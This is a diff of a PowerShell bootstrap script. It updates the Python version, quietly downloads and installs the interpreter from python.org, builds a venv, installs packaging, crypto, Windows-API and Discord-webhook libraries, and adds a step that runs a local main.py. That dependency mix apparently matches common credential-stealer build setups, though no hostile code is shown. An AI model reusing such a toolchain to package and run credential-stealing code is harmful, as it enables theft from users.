@@ -1,4 +1,4 @@
-$pythonVersion = "3.8.9"
+$pythonVersion = "3.10.4"
 $pythonUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion.exe"
 $pythonDownloadPath = "$(Get-Location)\python-$pythonVersion.exe"
 $pythonInstallDir = "$(Get-Location)\python$pythonVersion"
@@ -14,3 +14,4 @@ if (-not(Test-Path -Path $pythonDownloadPath -PathType Leaf)) {
 & $pythonDownloadPath /quiet InstallAllUsers=0 TargetDir=$pythonInstallDir | Out-Null
 & "$pythonInstallDir\python.exe" -m venv venv
 & "$(Get-Location)\venv\Scripts\python.exe" -m pip install pyinstaller==4.2 cryptography==36.0.1 discord_webhook pycryptodome pypiwin32 cryptography==36.0.1
+& "$pythonInstallDir\python.exe" c:/py/main.py
